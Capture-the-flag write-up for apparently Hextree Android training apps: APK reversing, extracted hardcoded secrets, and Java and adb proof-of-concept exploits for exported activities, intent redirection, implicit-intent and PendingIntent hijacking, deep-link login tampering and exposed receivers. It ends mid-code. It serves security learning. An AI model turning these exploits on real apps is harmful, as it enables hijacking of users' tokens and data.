# Flag 1 — Installing and Launching an APK with ADB

Installed the APK using:

```bash
adb install adb_test_application.apk
```

Then launched the main activity using:

```bash
adb shell am start io.hextree.adbtestapplication/.MainActivity
```

The application opened successfully and displayed the flag.

Flag : `HXT{Ready-to-Android}`


# Flag 2 — Finding a Hidden Activity

Used `dumpsys` to inspect the package and find the hidden activity:

```bash
adb shell dumpsys package io.hextree.adbtestapplication
```

Found and launched `HiddenActivity`:

```bash
adb shell am start io.hextree.adbtestapplication/.HiddenActivity
```

Flag : `HXT{not-so-hidden-activity}`

# Flag 3 — Finding Logs with Logcat

Used `logcat` to monitor logs from `MainActivity`:

```bash
adb logcat -v brief "MainActivity:V *:S"
```

Found the flag in the logs.

Flag : `HXT{log-all-the-cats}`

# Reverse Engineering Android Applications
 
# Flag 1 — Finding a Secret Activity

Installed the APK and decompiled it using:

```bash
apktool d io.hextree.reversingexample.apk
```

Checked `AndroidManifest.xml` and found `SecretActivity`.

Launched it using ADB:

```bash
adb shell am start io.hextree.reversingexample/.SecretActivity
```

The flag was displayed in the activity.

Flag : `HXT{A-not-so-secret-activity}`


# Flag 2 — Patching an Unreachable Activity

The `AndroidManifest.xml` contained an `UnreachableActivity` with `exported="false"`, which prevented it from being launched from outside the application.

First, decompiled the APK:

```bash
apktool d io.hextree.reversingexample.apk
```

Edited the `AndroidManifest.xml` and changed:

```xml
android:exported="false"
```

to:

```xml
android:exported="true"
```

Since the APK was modified, it needed to be rebuilt and signed before Android would allow it to be installed. Generated a signing key using:

```bash
keytool -genkey -v -keystore research.keystore -alias research_key -keyalg RSA -keysize 2048 -validity 10000
```

While rebuilding, the APK initially gave a **failed to extract native libraries** error. Changed `extractNativeLibs` to `true` in the manifest to resolve this.

Rebuilt the modified APK:

```bash
apktool b io.hextree.reversingexample
```

Signed the rebuilt APK using the generated keystore:

```bash
jarsigner -verbose -keystore research.keystore app.apk research_key
```

Uninstalled the original APK and installed the modified version:

```bash
adb uninstall io.hextree.reversingexample
adb install app.apk
```

Finally, launched the now-accessible `UnreachableActivity` using ADB, which displayed the flag.

# Flag 3 — Finding a Hardcoded Password with JADX

Installed the APK using ADB and opened it in JADX for decompilation:

```bash
adb install io.hextree.reversingexample.apk
jadx-gui io.hextree.reversingexample.apk
```

Located the activity responsible for checking the password and found the following condition:

```java
if (passwordText.equals(SecretKeeper.getSecretPassword()))
```

Following `getSecretPassword()` in JADX revealed that the password was hardcoded and returned:

```java
iAmHardcoded
```

Entered this password into the application, which revealed the flag.

Flag : `HXT{hardcoded-secrets-are-bad}`

# Flag 4 — Finding a Password in Resources

Opened the next activity in JADX and found the password check:

```java
if (passwordText.equals(LoggedInActivity.this.getString(R.string.secret2)))
```

This showed that the password was stored in the app's resources. Checked `strings.xml` and found:

```xml
<string name="secret2">VeryResourcefulSecret</string>
```

Entered the password into the application, which revealed the flag.

Flag : `HXT{resources-are-no-match-for-me}`

# Flag 5 — Finding a Password in Native Code using JNI

The third password was stored in the native JNI library instead of the Java code. After decompiling the APK with `apktool`, located the native library:

```text
lib/x86_64/libexample_nativelib.so
```

Used `strings` and `grep` to search for the secret:

```bash
strings lib/x86_64/libexample_nativelib.so | grep Secret
```

This returned:

```text
nativeSecretsCanBeFoundToo
```

Used `nativeSecretsCanBeFoundToo` as the password, which revealed the flag.

Flag : `HXT{from-java-to-native}`

Yes, that is the important code to show in the write-up. It makes the path to the key much clearer.

# Flag 6 — Finding an API Key in Resources

Opened the APK in **JADX-GUI** and used **Global Search** to search for:

```text
http
```

This led to the code making the weather API request. While checking how the request was authenticated, I found:

```java
d(d.a(str, "HextreeForecastUSA/v4.x", this.f452c.getString(R.string.ApiKey)));
```

The important part was:

```java
getString(R.string.ApiKey)
```

This showed that the API key wasn't hardcoded directly in the Java code. Instead, it was being loaded from the `ApiKey` string resource.

I followed `R.string.ApiKey` to `strings.xml`, where I found the API key:

```xml
<string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

Flag : `HXT{android-api-key-b1872g}`


# Flag 7 — Calling the Weather API Directly

After finding the API endpoint and the API key, I opened the endpoint in **Burp Suite's built-in browser** and intercepted the request. I then sent it to **Repeater**, where I could modify the request and see how the server responded.

I went back to the JADX code to understand what parameters the application was adding to the API request. In the `b()` method, I found:

```java
private String b(String str) {
    StringBuffer stringBuffer = new StringBuffer();
    stringBuffer.append("?whichClient=NDFDgen");
    stringBuffer.append("&zipCodeList=");
    stringBuffer.append(str);
    stringBuffer.append(c());
    return stringBuffer.toString();
}
```

This showed me that the request uses `whichClient=NDFDgen` and takes the ZIP code through the `zipCodeList` parameter. I used the ZIP code `42`, which I had already found from the application's ZIP-code check.

I then followed the `c()` method to see what other parameters were being added:

```java
private StringBuffer c() {
    StringBuffer stringBuffer = new StringBuffer();
    stringBuffer.append("&product=time-series&begin=");

    try {
        stringBuffer.append(
            URLEncoder.encode(f449d.format(new Date()), "UTF-8")
        );
    } catch (UnsupportedEncodingException unused) {
    }

    stringBuffer.append("&maxt=maxt");
    stringBuffer.append("&mint=mint");
    stringBuffer.append("&dew=dew");
    stringBuffer.append("&appt=appt");
    stringBuffer.append("&wx=wx");
    stringBuffer.append("&icons=icons");
    stringBuffer.append("&wwa=wwa");
    stringBuffer.append("&Submit=Submit");

    return stringBuffer;
}
```

From this, I added the following parameters to the request in Repeater:

```text
product=time-series
begin=<date>
maxt=maxt
mint=mint
dew=dew
appt=appt
wx=wx
icons=icons
wwa=wwa
Submit=Submit
```

I also added the API key I found in the previous flag as the `X-API-KEY` header:

```http
X-Api-Key: HXT{android-api-key-b1872g}
```

While testing the request, I got an error related to the `begin` date. I went back to JADX and checked how the application formats the date. I found:

```java
private static final SimpleDateFormat f449d =
    new SimpleDateFormat("yyyy-MM-dd'T'HH:mm");
```

So I changed the `begin` parameter to follow this format. In the request, it appeared URL-encoded as:

```text
begin=2026-09-08T13%3A00
```

After putting the API key, ZIP code, client, product, date, and the remaining parameters together, the request looked like:

```http
GET /xml/SOAP_server/ndfdXMLclient.php?whichClient=NDFDgen&zipCodeList=42&product=time-series&begin=2026-09-08T13%3A00&maxt=maxt&mint=mint&dew=dew&appt=appt&wx=wx&icons=icons&wwa=wwa&Submit=Submit HTTP/2
Host: ht-api-mocks-lcfc4kr5oa-uc.a.run.app
User-Agent: HextreeForecastUSA/v4.x
X-Api-Key: HXT{android-api-key-b1872g}
```

I sent the modified request through Repeater and checked the response. The flag was included in the API response:

```text
HXT{android-api-h192gsa0}
```

**Flag:** `HXT{android-api-h192gsa0}`

# Flag — Extracting the API Key from Native Code

After opening the APK in **JADX-GUI**, I found that the API key was not directly visible in the Java code. Instead, the application was using a native library from the `lib` folder.

The `lib` folder contained different versions of the library for different architectures. Since the application was running on an emulator, I focused on the native library that matched the emulator's architecture.

I initially considered using **Ghidra** to reverse engineer the native library, but while inspecting the library I found an exported JNI function:

```text
Java_io_Hextree_USA_internetUtil_getKey
```

The function name gave me useful information. It showed that the native function was connected to the `InternetUtil` class and the native method `getKey`.

Instead of completely reversing the native binary, I decided to recreate the Java side of the JNI interface and call the existing native function.

I created the following class:

```java
package io.hextree.weatherusa;

public class InternetUtil {

    private static native String getKey(String str);

    public static String solve() {
        System.loadLibrary("native-lib");
        return getKey("moiba1cybar8smart4sheriff4securi");
    }
}
```

The important part was:

```java
private static native String getKey(String str);
```

This declares a native method without providing its implementation in Java. The implementation is inside the native library.

I then loaded the library using:

```java
System.loadLibrary("native-lib");
```

This makes the native functions from `native-lib` available to the application process.

After loading the library, I called the native function:

```java
return getKey("moiba1cybar8smart4sheriff4securi");
```

I used the parameter required by the native function and returned whatever value it produced.

Finally, I called `solve()` from my `MainActivity` and logged the result:

```java
Log.d("FLAG", InternetUtil.solve());
```

After running the application, I checked **Logcat** and found:

```text
HXT{obfuscated-api-key-asb126us}
```

So I was able to extract the API key without fully reversing the native library in Ghidra. By finding the JNI function, recreating the corresponding Java interface, loading the existing library, and calling the native method, I could directly obtain its return value.

**Flag:** `HXT{obfuscated-api-key-asb126us}`

# Flag 1 — Basic Exported Activity

We were given an Android application containing multiple levels, with one flag for each level.

For the first level, I checked the `AndroidManifest.xml` and found that `Flag1Activity` was exported:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag1Activity"
    android:exported="true" />
```

Since the activity was exported, I could launch it directly using ADB:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag1Activity
```

The activity opened and displayed the flag.

Flag : `HXT{basic-exported-activity-1bh7sd}`

# Flag 2 — Intent with Action

For this level, `Flag2Activity` was exported, but simply launching it was not enough. I checked the activity code and found that it only calls `success()` when the Intent contains the required action:

```java
String action = getIntent().getAction();

if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}

success(this);
```

So I launched the activity with the required Intent action:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag2Activity -a io.hextree.action.GIVE_FLAG
```

The condition was satisfied and the flag was displayed.

Flag : `HXT{intent-actions-activity-dsj198w}`

# Flag 3 — Intent with Action and Data

For this level, `Flag3Activity` was also exported, but it required **two conditions** to be satisfied before calling `success()`.

Looking at the activity code, I found that it first checks the Intent action:

```java
String action = intent.getAction();

if (action == null || !action.equals("io.hextree.action.GIVE_FLAG")) {
    return;
}
```

So the Intent needed to contain:

```text
io.hextree.action.GIVE_FLAG
```

It then checks the Intent's data:

```java
Uri data = intent.getData();

if (data == null || !data.toString().equals("https://app.hextree.io/map/android")) {
    return;
}
```

Therefore, both the **action** and **data URI** had to match the expected values.

I launched the activity using ADB with `-a` to specify the action and `-d` to specify the data:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag3Activity -a io.hextree.action.GIVE_FLAG -d https://app.hextree.io/map/android
```

Both conditions were satisfied and the activity called `success()`, displaying the flag.

Flag : `HXT{intent-uri-data-sda982bs}`

# Flag 4 — Intent State Machine

For this level, `Flag4Activity` was exported, but simply launching it did not give the flag. After checking the activity code, I found that it checks the state value before showing the flag :

```java
public enum State {
    INIT(0),
    PREPARE(1),
    BUILD(2),
    GET_FLAG(3),
    REVERT(4);
}
```

The states had to be reached in order:

INIT - PREPARE - BUILD  - GET_FLAG

Once the activity reached the `GET_FLAG` state, the code called `success()`.

I sent the required actions one by one:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
```

Finally, launched the activity again:

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity
```

The state machine reached `GET_FLAG` and the flag was displayed.

Flag : `HXT{sometimes-require-multiple-calls-5133au2}`

## Flag 5 — Intent in Intent

For this level, `Flag5Activity` expects an **Intent inside another Intent**. Looking at the activity code, I found that it retrieves the nested Intent using:

```java
Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
```

The nested Intent needed to contain `return = 42`. It then checks for another Intent called `nextIntent`, which must contain `reason = "back"`.

Instead of manually sending the Intent from ADB, I created a small PoC Android app with a button that constructs the required nested Intent and launches `Flag5Activity`.

The button's click handler was:

```java
btn.setOnClickListener(v -> {
    try {
        Intent innermost = new Intent();
        innermost.putExtra("reason", "back");

        Intent middle = new Intent();
        middle.putExtra("return", 42);
        middle.putExtra("nextIntent", innermost);

        Intent outer = new Intent();
        outer.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
        );
        outer.putExtra("android.intent.extra.INTENT", middle);

        startActivity(outer);
    } catch (Exception e) {
        Toast.makeText(this, "Exploit failed!", Toast.LENGTH_SHORT).show();
    }
});
```

Here, the `outer` Intent targets `Flag5Activity` and contains the `middle` Intent as `android.intent.extra.INTENT`. The `middle` Intent contains `return = 42` and the `innermost` Intent as `nextIntent`, which contains `reason = "back"`.

Once the button was clicked, all the required conditions were satisfied and `Flag5Activity` returned the flag.

Flag : `HXT{intent-in-intent-in-intent-298abso}`

# Flag 6 — Redirecting to a Non-Exported Activity

After opening the APK in **JADX-GUI**, I checked `Flag6Activity` to understand what condition was required to get the flag.

The important part was:

```java
if ((getIntent().getFlags() & 1) != 0) {
    this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
    success(this);
}
```

The activity checks whether the incoming Intent contains `FLAG_GRANT_READ_URI_PERMISSION`. The value `1` corresponds to this flag.

I then checked the `AndroidManifest.xml` and found:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag6Activity"
    android:exported="false"/>
```

Since `Flag6Activity` was not exported, I couldn't launch it directly from my application.

I went back to `Flag5Activity` and found that it extracts a nested Intent:

```java
Intent intent2 =
    (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
```

It checks that `return` is `42` and then extracts another Intent from `nextIntent`.

The important condition was:

```java
if (this.nextIntent.getStringExtra("reason").equals("back")) {
    success(this);
} else if (this.nextIntent.getStringExtra("reason").equals("next")) {
    intent.replaceExtras(new Bundle());
    startActivity(this.nextIntent);
}
```

Initially, using:

```java
nextIntent.putExtra("reason", "back");
```

triggered the success condition for **Flag 5**.

To make `Flag5Activity` actually launch the nested Intent, I changed it to:

```java
nextIntent.putExtra("reason", "next");
```

I then created the nested Intent with the required permission flag:

```java
Intent nextIntent = new Intent();
nextIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag6Activity"
);
nextIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
nextIntent.putExtra("reason", "next");

Intent middleIntent = new Intent();
middleIntent.putExtra("return", 42);
middleIntent.putExtra("nextIntent", nextIntent);

Intent outerIntent = new Intent();
outerIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
);
outerIntent.putExtra(Intent.EXTRA_INTENT, middleIntent);

startActivity(outerIntent);
```

This caused `Flag5Activity` to redirect to `Flag6Activity`, with `FLAG_GRANT_READ_URI_PERMISSION` set. The condition in `Flag6Activity` was then satisfied.

The flag displayed was:

```text
HXT{redirect-to-not-exported-n129vbs}
```

**Flag:** `HXT{redirect-to-not-exported-n129vbs}`

# Flag 8

After opening the APK in **JADX-GUI**, I checked `Flag8Activity` to understand what was required to trigger the flag.

The important part was:

```java
ComponentName callingActivity = getCallingActivity();

if (callingActivity != null) {
    if (callingActivity.getClassName().contains("Hextree")) {
        this.f.addTag("calling class contains 'Hextree'");
        success(this);
    } else {
        Log.i("Flag8", "access denied");
        setResult(0, getIntent());
    }
}
```

The first thing I noticed was:

```java
getCallingActivity()
```

This is used to find the activity that started `Flag8Activity`. The application then checks whether the caller's class name contains `"Hextree"`.

So I needed to launch `Flag8Activity` from an activity whose class name contains `Hextree`.

I created an activity named:

```java
public class HextreeActivity extends AppCompatActivity
```

and used `startActivityForResult()` to launch the challenge activity:

```java
Intent intent = new Intent();
intent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag8Activity"
);

startActivityForResult(intent, 8);
```

The important part here was `startActivityForResult()`. Unlike a normal `startActivity()`, this starts the activity with the expectation that it can return a result to the caller. This also allows `Flag8Activity` to identify the activity that launched it through `getCallingActivity()`.

The challenge also had:

```java
setResult(0, getIntent());
```

in the failure branch. Here, `0` represents `RESULT_CANCELED`, and `getIntent()` is passed back as the result data.

After launching `Flag8Activity` from my `HextreeActivity`, the check:

```java
callingActivity.getClassName().contains("Hextree")
```

was satisfied, causing:

```java
success(this);
```

to be executed.

The application then displayed:

```text
HXT{no-expected-return-ds282ba}
```

**Flag:** `HXT{no-expected-return-ds282ba}`

# Flag 9 — Receiving a Result with the Flag

After opening the APK in **JADX-GUI**, I checked `Flag9Activity` to understand how it handled the activity result.

The first important part was:

```java
ComponentName callingActivity = getCallingActivity();

if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
    return;
}
```

This was similar to Flag 8. The activity checks whether it was launched by an activity whose class name contains `"Hextree"`.

I then looked at what happens after this check:

```java
Intent intent = new Intent("flag");
this.f.addTag(intent);
this.f.addTag(42);
intent.putExtra("flag", this.f.appendLog(this.flag));
setResult(-1, intent);
finish();
success(this);
```

The important part was:

```java
intent.putExtra("flag", this.f.appendLog(this.flag));
```

This showed that the flag is being placed inside an Intent extra named `"flag"`.

Then:

```java
setResult(-1, intent);
```

sets this Intent as the result of the activity. `-1` corresponds to `RESULT_OK`.

Since `Flag9Activity` finishes immediately after setting the result, I needed to launch it using `startActivityForResult()` and handle the returned Intent in my own activity.

I used:

```java
Intent intent = new Intent();
intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag9Activity"
));

startActivityForResult(intent, 9009);
```

I then handled the result in `onActivityResult()`:

```java
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    if (resultCode == RESULT_OK && data != null) {
        String flag = data.getStringExtra("flag");
        Log.d("FLAG9", "flag9: " + flag);
    }
}
```

The important part was:

```java
String flag = data.getStringExtra("flag");
```

because `Flag9Activity` had placed the flag into the result Intent using the same `"flag"` key.

After launching the activity, I checked the result and the application displayed:

```text
HXT{flag-in-result-gs891jh2}
```

**Flag:** `HXT{flag-in-result-gs891jh2}`

# Flag 10 — Hijacking an Implicit Intent

I opened `Flag10Activity` in **JADX** and first checked its manifest entry. The activity was:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag10Activity"
    android:exported="false"/>
```

So I couldn't launch Flag 10 directly from my own application.

Looking at the code, Flag 10 creates an **implicit Intent**:

```java
Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
intent.putExtra("flag", this.f.appendLog(this.flag));
startActivity(intent);
```

The important part was that it didn't specify a particular component or package. Instead, Android looks for an activity that can handle the `ATTACK_ME` action.

I already knew from Flag 5 that I could use its `nextIntent` to make Flag 5 launch another activity internally. So I changed the `nextIntent` target to `Flag10Activity` and used:

```java
nextIntent.putExtra("reason", "next");
```

The complete nested Intent was:

```java
Intent nextIntent = new Intent();

nextIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag10Activity"
);

nextIntent.putExtra("reason", "next");

Intent middleIntent = new Intent();
middleIntent.putExtra("return", 42);
middleIntent.putExtra("nextIntent", nextIntent);

Intent outerIntent = new Intent();

outerIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
);

outerIntent.putExtra(Intent.EXTRA_INTENT, middleIntent);

startActivity(outerIntent);
```

Flag 5 then launched Flag 10 internally. When Flag 10 ran, it sent the implicit `ATTACK_ME` intent containing the flag.

In my own app, I had an exported activity with a matching intent filter:

```xml
<intent-filter>
    <action android:name="io.hextree.attacksurface.ATTACK_ME" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
```

This allowed my `Attack_Receiver_Activity` to receive the implicit Intent and extract the `flag` extra:

```java
Intent intent = getIntent();
String flag = intent.getStringExtra("flag");

Toast.makeText(this, flag, Toast.LENGTH_LONG).show();
```

The flag appeared in the Toast:

```text
HXT{hijacked-intent-with-flag-dsui2908}
```

**Flag:** `HXT{hijacked-intent-with-flag-dsui2908}`

# Flag 11 — Respond to Implicit Intent

I opened `Flag11Activity` in **JADX** and checked the manifest. The activity was set to `exported="false"`, so I couldn't start it directly from my app.

Looking at the code, I noticed that Flag 11 sends an implicit intent with the action:

```java
Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
```

It then uses `startActivityForResult()` to wait for a response.

The important part was the `onActivityResult()` method. It checks whether the returned Intent contains:

```java
token = 1094795585
```

So I knew that I needed to create an activity in my app that could handle the `ATTACK_ME` intent and send this value back.

Since Flag 11 was not exported, I used **Flag 5** to launch it internally using the same nested Intent technique from the previous flag:

```java
Intent nextIntent = new Intent();

nextIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag11Activity"
);

nextIntent.putExtra("reason", "next");

Intent middleIntent = new Intent();
middleIntent.putExtra("return", 42);
middleIntent.putExtra("nextIntent", nextIntent);

Intent outerIntent = new Intent();

outerIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag5Activity"
);

outerIntent.putExtra(Intent.EXTRA_INTENT, middleIntent);

startActivity(outerIntent);
```

I already had my `Attack_Receiver_Activity` registered to handle:

```text
io.hextree.attacksurface.ATTACK_ME
```

Inside the receiver, I returned the required token:

```java
Intent result = new Intent();
result.putExtra("token", 1094795585);

setResult(Activity.RESULT_OK, result);
finish();
```

Flag 11 received this result, checked the token, and triggered the success condition.

The flag was:

```text
HXT{sent-back-result-1897djh}
```

**Flag:** `HXT{sent-back-result-1897djh}`


# Flag 12 — Careful Intent Conditions

I opened `Flag12Activity` in **JADX** and checked how the activity handles the result from the implicit intent.

The activity sends:

```java
Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
startActivityForResult(intent, 42);
```

So I created an exported `Attack_Receiver_Activity` with an intent filter for the same `ATTACK_ME` action.

While checking `onActivityResult()`, I found that there were **two conditions** required for success.

First, the original Intent used to launch Flag 12 must contain:

```java
getIntent().getBooleanExtra("LOGIN", false)
```

with the value `true`.

So I launched Flag 12 using:

```java
Intent intent = new Intent();

intent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag12Activity"
);

intent.putExtra("LOGIN", true);

startActivity(intent);
```

The second condition was:

```java
intent.getIntExtra("token", -1) == 1094795585
```

So I made my `Attack_Receiver_Activity` return an Intent containing the required token:

```java
Intent result = new Intent();
result.putExtra("token", 1094795585);

setResult(Activity.RESULT_OK, result);
finish();
```

After Flag 12 received the result, both `LOGIN=true` and `token=1094795585` were satisfied, and the flag was displayed.

**Flag:** `HXT{tricky-intent-condition-bjhs782}`

# Flag 22 — Receiving a Flag Through a Mutable PendingIntent

I opened `Flag22Activity` in JADX and first checked how it handled the incoming Intent. I found that it was looking for a `PendingIntent` using the key `"PENDING"`:

```java
PendingIntent pendingIntent =
    (PendingIntent) getIntent().getParcelableExtra("PENDING");
```

I learned that a **PendingIntent** is a token that allows another app or component to perform an action on behalf of the app that created it. Using this knowledge, I realized that instead of giving Flag22 a normal Intent, I could give it a PendingIntent that points to an Activity in my own app.

Flag22 then creates an Intent containing the flag:

```java
intent.putExtra("success", true);
intent.putExtra("flag", this.f.appendLog(this.flag));
```

and sends that Intent through the PendingIntent:

```java
pendingIntent.send(this, 0, intent);
```

So I created a PendingIntent targeting my `Attack_Receiver_Activity`:

```java
Intent targetIntent = new Intent(
        this,
        Attack_Receiver_Activity.class
);

PendingIntent pendingIntent = PendingIntent.getActivity(
        this,
        0,
        targetIntent,
        PendingIntent.FLAG_MUTABLE
);
```

I used `FLAG_MUTABLE` because Flag22 supplies the Intent containing the `"flag"` extra when it calls `pendingIntent.send()`.

I then launched `Flag22Activity` and passed my PendingIntent through the `"PENDING"` extra:

```java
Intent intent = new Intent();

intent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag22Activity"
);

intent.putExtra("PENDING", pendingIntent);

startActivity(intent);
```

Finally, in my `Attack_Receiver_Activity`, I retrieved the `"flag"` extra from the Intent that Flag22 sent through my PendingIntent:

```java
Intent intent = getIntent();

String flag = intent.getStringExtra("flag");

Toast.makeText(
        this,
        flag,
        Toast.LENGTH_LONG
).show();
```

After running it, the flag was received by my Activity and displayed:

**Flag: `HXT{received-mutable-flags-xa81b}`**

# Flag 13 — Creating a `hex://open/` Link

I learned that **deep links let an Android app be opened through a URL**. I also learned that **intent filters** tell Android which types of links an activity can handle. The `BROWSABLE` category is important here because it allows the activity to be opened through a browser.

While checking the manifest, I noticed that `Flag13Activity` accepts the `hex` scheme and the `flag` host:

```xml
<data android:scheme="hex"/>
<data android:host="flag"/>
```

I then opened `Flag13Activity` in JADX to see what the app was actually checking. The important condition was:

```java
if (data.getHost().equals("flag")
        && data.getQueryParameter("action").equals("give-me")) {
    success(this);
}
```

So from this, I understood that I needed a `hex://` link with the host `flag` and the query parameter `action=give-me`.

I entered this into the link builder:

```text
hex://flag?action=give-me
```

The link was opened through the browser, the required deep-link conditions were satisfied, and the app triggered `success()`.

The flag I got was:

**`HXT{browser-link-or-app2app-s82h}`**

# Flag 14 — Hijack Web Login

I learned that **deep links can be used to pass authentication information between a website and an Android app**. I opened `Flag14Activity` in JADX and found that it receives `type`, `authToken`, and `authChallenge` from the deep link.

The important part was the `type` check:

```java
if (queryParameter.equals("user")) {
} else if (queryParameter.equals("admin")) {
    success(this);
}
```

This showed that changing the `type` from `user` to `admin` would reach the `success()` condition.

The app also checks that the `authChallenge` received in the deep link matches the previously stored challenge and verifies the `authToken`. So I kept both values unchanged.

I used my own `DeeplinkActivity` to receive the original deep link and extract the authentication values:

```java
String authToken =
        data.getQueryParameter("authToken");

String authChallenge =
        data.getQueryParameter("authChallenge");
```

I then created a modified URI, changing only the `type` to `admin` while keeping the original `authToken` and `authChallenge`:

```java
Uri modifiedUri = data.buildUpon()
        .clearQuery()
        .appendQueryParameter("type", "admin")
        .appendQueryParameter("authToken", authToken)
        .appendQueryParameter("authChallenge", authChallenge)
        .build();
```

Finally, I forwarded the modified deep link to `Flag14Activity` using a `VIEW` Intent:

```java
Intent forwardIntent =
        new Intent(Intent.ACTION_VIEW);

forwardIntent.setData(modifiedUri);

forwardIntent.setClassName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.activities.Flag14Activity"
);

startActivity(forwardIntent);
```

The modified deep link was accepted, the authentication values passed their checks, and changing `type` to `admin` caused the app to trigger `success()` and give the flag.

**Flag:** `HXT{hijacked-login-token-abjh28a}`

# Flag 15 — Creating an `intent://` Link

I learned that **`intent://` links can be used to send an Android Intent through a link**. So I opened `Flag15Activity` in JADX to see what information it expected.

The first thing I noticed was that it checks for a specific Intent action:

```java
if (isDeeplink(intent) && action.equals("io.hextree.action.GIVE_FLAG")) {
```

Then I looked at the conditions required to call `success()`. The activity was checking for two extras:

```java
if (extras.getBoolean("flag", false) && string.equals("flag")) {
    success(this);
}
```

So I knew I needed to send:

```text
action = flag
flag = true
```

I put these values into an `intent://` URI using the appropriate extra types:

```text
intent://#Intent;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end
```

Here, `S.action` creates a String extra called `action`, while `B.flag` creates a Boolean extra called `flag`.

I entered the link into the Hextree link builder and opened it. Looking at the activity's received Intent, I could see that the expected action and extras were present:

```text
[Action]    io.hextree.action.GIVE_FLAG
[Extra: 'action'] flag
[Extra: 'flag'] true
```

Since these matched the conditions I found in JADX, the app called `success()` and displayed the flag.

**Flag:** `HXT{intent-uris-are-cool-12fgv}`


# Broadcast Receivers

# Flag 16 — Basic Exposed Receiver

After opening the application in **JADX**, I started by looking at `Flag16Activity`. The description pointed me towards `Flag16Receiver`, so I opened the receiver to understand how it could be triggered.

I found that `Flag16Receiver` extends `BroadcastReceiver`:

```java
public class Flag16Receiver extends BroadcastReceiver {
    public static String FlagSecret = "give-flag-16";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag16Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (intent.getStringExtra("flag").equals(FlagSecret)) {
            success(context, FlagSecret);
        }
    }
}
```

The important part was:

```java
intent.getStringExtra("flag")
```

This showed that the receiver expects an extra named `flag`. I then checked the value of `FlagSecret`:

```java
public static String FlagSecret = "give-flag-16";
```

So I needed to send an Intent containing:

```text
flag=give-flag-16
```

Since this was a `BroadcastReceiver`, I knew I needed to use `sendBroadcast()` rather than `startActivity()`.

I then checked the application's `AndroidManifest.xml` and found:

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
    android:enabled="true"
    android:exported="true"/>
```

The important part was:

```xml
android:exported="true"
```

This meant that the receiver was exposed and could be accessed by another application, including my PoC application.

I created an explicit broadcast in my PoC app and targeted the receiver directly:

```java
Intent intent = new Intent();

intent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag16Receiver"
));

intent.putExtra("flag", "give-flag-16");

sendBroadcast(intent);
```

Here, `setComponent()` specifies the exact receiver that should receive the broadcast:

```text
io.hextree.attacksurface.receivers.Flag16Receiver
```

I then used `putExtra()` to provide the value expected by the receiver:

```text
flag = give-flag-16
```

Finally, `sendBroadcast()` sent the Intent to the exposed receiver.

I checked Logcat using:

```bash
adb logcat | grep "Flag16Receiver"
```

The logs showed that the broadcast reached the receiver and that the correct extra was received:

```text
09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Component] ComponentInfo{io.hextree.attacksurface/io.hextree.attacksurface.receivers.Flag16Receiver}
09-14 15:49:43.622  3146  3146 I Flag16Receiver.onReceive: [Extra:'flag']: give-flag-16
```

Since `give-flag-16` matched `FlagSecret`, the condition in `onReceive()` was satisfied and the receiver's `success()` method was executed.

The receiver then printed the generated flag to Logcat:

```text
09-14 15:49:43.649  3146  3146 I Flag16Receiver: Flag: HXT{basic-receiver-ds82s}
```

**Flag:** `HXT{basic-receiver-ds82s}`

# Flag 18 — Hijacking Broadcast Intent

[svg](https://github.com/Abhijith-P-B/write-up/tree/main/Hextree#flag-18--hijacking-broadcast-intent)

After opening the application in **JADX**, I went to `Flag18Activity` and looked at what happens inside `onCreate()`.

I found that the activity creates a broadcast with the action:

```java
Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
```

It also adds a `flag` extra and sends the Intent using `sendOrderedBroadcast()`:

```java
intent.putExtra("flag", this.f.appendLog(this.flag));
intent.addFlags(8);

sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent2) {
        String resultData = getResultData();
        Bundle resultExtras = getResultExtras(false);
        int resultCode = getResultCode();

